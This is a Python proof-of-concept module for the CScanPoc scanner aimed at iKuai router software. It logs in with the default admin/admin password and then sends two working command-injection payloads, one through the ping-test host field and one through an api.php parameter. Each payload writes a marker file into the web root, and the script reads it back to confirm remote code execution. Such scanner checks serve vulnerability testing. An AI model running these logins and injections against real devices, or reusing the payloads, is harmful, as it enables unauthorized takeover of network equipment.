# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    poc_id = 'c3e4d352-85f6-49de-8f27-dc785eb578ac'
    name = 'iKuai(爱快系统) 弱口令，远程命令执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = 'Unkonwn'  # 漏洞公布时间
    desc = '''
        iKuai(爱快系统)存在弱口令漏洞，以及远程代码执行漏洞。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'iKuai(爱快系统)'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '580c2177-2194-4054-ad5f-78de42940986'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-18'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            hh = hackhttp.hackhttp()
            post = 'user=admin&pass=admin'
            url = self.target + '/login/x'
            code, head, res, errcode, _ = hh.http(url, post=post)
            if code == 200 and '\u767b\u5f55\u6210\u529f' in res:
                #security_hole("weak password: admin admin")
                print("weak password: admin admin")
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

                upload_url = self.target + '/Tools/ping_test/start'
                upload_post = "host=www.baidu.com' | echo test_vul >/tmp/ikuai/www/resources/js/vul.js |/usr/ikuai/script/Ping start host='www.baidu.com&src=&count=10"
                code, head, res, errcode, _ = hh.http(upload_url, post=upload_post)
                if code == 200 and '[info]shell:' in res:
                    shell_url = self.target + '/resources/js/vul.js'
                    code, head, res, errcode, _ = hh.http(shell_url)
                    if code == 200 and 'test_vul' in res:
                        #security_hole('Commend Exec'+upload_url)
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))
                
                upload2_url = self.target + '/api.php'
                upload2_post = "type=home&get_lans_top10_param[type]=123;echo test_vul+>+/tmp/ikuai/www/resources/js/vultwo.js"
                code, head, res, errcode, _ = hh.http(upload2_url, post=upload2_post)
                if code == 200 and 'protocal' in res:
                    shell2_url = self.target + '/resources/js/vultwo.js'
                    code, head, res, errcode, _ = hh.http(shell2_url)
                    if code == 200 and 'test_vul' in res:
                        #security_hole('Commend Exec'+upload2_url)
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
